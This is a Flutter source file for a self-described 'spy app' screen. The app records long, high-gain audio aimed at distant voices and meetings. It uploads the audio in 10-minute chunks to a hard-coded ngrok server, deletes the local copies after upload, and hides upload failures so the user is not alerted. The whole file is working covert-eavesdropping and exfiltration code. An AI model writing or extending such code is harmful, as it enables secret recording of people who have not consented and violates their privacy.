import 'package:flutter/material.dart';
import 'package:record/record.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'dart:io';
import 'dart:async';

class RecordingScreen extends StatefulWidget {
  const RecordingScreen({super.key});

  @override
  State<RecordingScreen> createState() => _RecordingScreenState();
}

class _RecordingScreenState extends State<RecordingScreen> {
  final AudioRecorder _recorder = AudioRecorder();
  bool _isRecording = false;
  bool _isUploading = false;
  String? _currentAudioPath;
  Timer? _chunkTimer;
  int _recordingDuration = 0;
  Timer? _durationTimer;
  bool _hasPermission = false;

  @override
  void initState() {
    super.initState();
    _checkPermissions();
  }

  Future<void> _checkPermissions() async {
    final hasPermission = await _recorder.hasPermission();
    setState(() {
      _hasPermission = hasPermission;
    });
    
    if (!hasPermission) {
      _showPermissionDialog();
    }
  }

  void _showPermissionDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext context) {
        return AlertDialog(
          backgroundColor: const Color.fromARGB(255, 20, 45, 65),
          title: const Row(
            children: [
              Icon(Icons.mic, color: Colors.orange),
              SizedBox(width: 10),
              Text(
                'Microphone Access',
                style: TextStyle(color: Colors.white),
              ),
            ],
          ),
          content: const Text(
            'This spy app needs microphone access to record audio. Please grant permission to continue.',
            style: TextStyle(color: Colors.white70),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(context).pop(),
              child: const Text(
                'Cancel',
                style: TextStyle(color: Colors.grey),
              ),
            ),
            ElevatedButton(
              onPressed: () async {
                Navigator.of(context).pop();
                await _requestPermission();
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.blue,
              ),
              child: const Text(
                'Grant Permission',
                style: TextStyle(color: Colors.white),
              ),
            ),
          ],
        );
      },
    );
  }

  Future<void> _requestPermission() async {
    final status = await Permission.microphone.request();
    
    setState(() {
      _hasPermission = status == PermissionStatus.granted;
    });
    
    if (status == PermissionStatus.permanentlyDenied) {
      _showSettingsDialog();
    } else if (status == PermissionStatus.denied) {
      _showPermissionDeniedDialog();
    }
  }

  void _showSettingsDialog() {
    showDialog(
      context: context,
      builder: (BuildContext context) {
        return AlertDialog(
          backgroundColor: const Color.fromARGB(255, 20, 45, 65),
          title: const Row(
            children: [
              Icon(Icons.settings, color: Colors.red),
              SizedBox(width: 10),
              Text(
                'Permission Required',
                style: TextStyle(color: Colors.white),
              ),
            ],
          ),
          content: const Text(
            'Microphone permission is permanently denied. Please enable it in Settings > Privacy > Microphone.',
            style: TextStyle(color: Colors.white70),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(context).pop(),
              child: const Text(
                'Cancel',
                style: TextStyle(color: Colors.grey),
              ),
            ),
            ElevatedButton(
              onPressed: () {
                Navigator.of(context).pop();
                openAppSettings();
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.orange,
              ),
              child: const Text(
                'Open Settings',
                style: TextStyle(color: Colors.white),
              ),
            ),
          ],
        );
      },
    );
  }

  void _showPermissionDeniedDialog() {
    showDialog(
      context: context,
      builder: (BuildContext context) {
        return AlertDialog(
          backgroundColor: const Color.fromARGB(255, 20, 45, 65),
          title: const Row(
            children: [
              Icon(Icons.warning, color: Colors.amber),
              SizedBox(width: 10),
              Text(
                'Permission Denied',
                style: TextStyle(color: Colors.white),
              ),
            ],
          ),
          content: const Text(
            'Microphone access is required for spy recording. Would you like to try again?',
            style: TextStyle(color: Colors.white70),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(context).pop(),
              child: const Text(
                'Not Now',
                style: TextStyle(color: Colors.grey),
              ),
            ),
            ElevatedButton(
              onPressed: () {
                Navigator.of(context).pop();
                _requestPermission();
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.blue,
              ),
              child: const Text(
                'Try Again',
                style: TextStyle(color: Colors.white),
              ),
            ),
          ],
        );
      },
    );
  }

  Future<void> _toggleRecording() async {
    if (_isRecording) {
      await _stopRecording();
    } else {
      await _startRecording();
    }
  }

  Future<void> _startRecording() async {
    if (!_hasPermission) {
      _showPermissionDialog();
      return;
    }

    final directory = await getTemporaryDirectory();
    _currentAudioPath = '${directory.path}/spy_${DateTime.now().millisecondsSinceEpoch}.wav';

    // HIGH QUALITY SETTINGS FOR SPY RECORDING
    await _recorder.start(
      const RecordConfig(
        encoder: AudioEncoder.wav,
        bitRate: 128000,        // Higher quality for distant voices
        sampleRate: 44100,      // CD quality for better distant sound capture
        numChannels: 1,         // Mono saves space but maintains quality
        autoGain: true,         // Automatically adjusts gain for distant voices
        echoCancel: false,      // Keep echo for better distant sound
        noiseSuppress: false,   // Keep ambient noise for context
      ),
      path: _currentAudioPath!,
    );

    setState(() {
      _isRecording = true;
      _recordingDuration = 0;
    });

    // Start duration timer
    _durationTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      setState(() {
        _recordingDuration++;
      });
    });

    // Auto-chunk every 10 minutes for long recordings
    _chunkTimer = Timer.periodic(const Duration(minutes: 10), (timer) {
      _createChunk();
    });
  }

  Future<void> _createChunk() async {
    if (!_isRecording) return;
    
    // Stop current recording
    await _recorder.stop();
    
    // Upload the chunk
    if (_currentAudioPath != null) {
      _uploadAudioChunk(_currentAudioPath!);
    }
    
    // Start new chunk
    final directory = await getTemporaryDirectory();
    _currentAudioPath = '${directory.path}/spy_chunk_${DateTime.now().millisecondsSinceEpoch}.wav';
    
    await _recorder.start(
      const RecordConfig(
        encoder: AudioEncoder.wav,
        bitRate: 128000,
        sampleRate: 44100,
        numChannels: 1,
        autoGain: true,
        echoCancel: false,
        noiseSuppress: false,
      ),
      path: _currentAudioPath!,
    );
  }

  Future<void> _stopRecording() async {
    await _recorder.stop();
    _chunkTimer?.cancel();
    _durationTimer?.cancel();
    
    setState(() {
      _isRecording = false;
    });
    
    if (_currentAudioPath != null) {
      await _uploadAudioChunk(_currentAudioPath!);
    }
  }

  Future<void> _uploadAudioChunk(String filePath) async {
    try {
      final file = File(filePath);
      if (!file.existsSync()) return;
      
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('https://721f9a3a332b.ngrok-free.app/recording-transcript'),
      );
      
      request.fields['timestamp'] = DateTime.now().toIso8601String();
      request.fields['duration'] = _recordingDuration.toString();
      request.files.add(await http.MultipartFile.fromPath('audio', filePath));
      
      final response = await request.send();
      
      if (response.statusCode == 200) {
        await file.delete(); // Clean up after successful upload
      }
    } catch (e) {
      // Silent fail for spy mode - don't alert user
      print('Upload error: $e');
    }
  }

  String _formatDuration(int seconds) {
    final hours = seconds ~/ 3600;
    final minutes = (seconds % 3600) ~/ 60;
    final secs = seconds % 60;
    
    if (hours > 0) {
      return '${hours.toString().padLeft(2, '0')}:${minutes.toString().padLeft(2, '0')}:${secs.toString().padLeft(2, '0')}';
    }
    return '${minutes.toString().padLeft(2, '0')}:${secs.toString().padLeft(2, '0')}';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color.fromARGB(255, 3, 28, 48),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            GestureDetector(
              onTap: _toggleRecording,
              child: Container(
                width: 120,
                height: 120,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: _isRecording ? Colors.red : (_hasPermission ? Colors.blue : Colors.grey),
                  boxShadow: _isRecording ? [
                    BoxShadow(
                      color: Colors.red.withOpacity(0.3),
                      blurRadius: 20,
                      spreadRadius: 5,
                    ),
                  ] : null,
                ),
                child: Icon(
                  _isRecording ? Icons.stop : (_hasPermission ? Icons.mic : Icons.mic_off),
                  size: 60,
                  color: Colors.white,
                ),
              ),
            ),
            const SizedBox(height: 30),
            if (_isRecording) ...[
              Text(
                'Recording: ${_formatDuration(_recordingDuration)}',
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 18,
                  fontWeight: FontWeight.w500,
                ),
              ),
              const SizedBox(height: 10),
              Text(
                'High Quality • Auto-Gain • Long Duration',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.7),
                  fontSize: 12,
                ),
              ),
            ] else ...[
              if (!_hasPermission) ...[
                const Icon(
                  Icons.mic_off,
                  color: Colors.red,
                  size: 40,
                ),
                const SizedBox(height: 10),
                const Text(
                  'Microphone Permission Required',
                  style: TextStyle(
                    color: Colors.red,
                    fontSize: 18,
                    fontWeight: FontWeight.w500,
                  ),
                ),
                const SizedBox(height: 10),
                ElevatedButton(
                  onPressed: _requestPermission,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.blue,
                    padding: const EdgeInsets.symmetric(horizontal: 30, vertical: 15),
                  ),
                  child: const Text(
                    'Grant Permission',
                    style: TextStyle(color: Colors.white),
                  ),
                ),
              ] else ...[
                const Text(
                  'Tap to start spy recording',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 18,
                    fontWeight: FontWeight.w500,
                  ),
                ),
                const SizedBox(height: 10),
                Text(
                  'Optimized for distant voices & long meetings',
                  style: TextStyle(
                    color: Colors.white.withOpacity(0.7),
                    fontSize: 12,
                  ),
                ),
              ],
            ],
          ],
        ),
      ),
    );
  }

  @override
  void dispose() {
    _chunkTimer?.cancel();
    _durationTimer?.cancel();
    _recorder.dispose();
    super.dispose();
  }
}
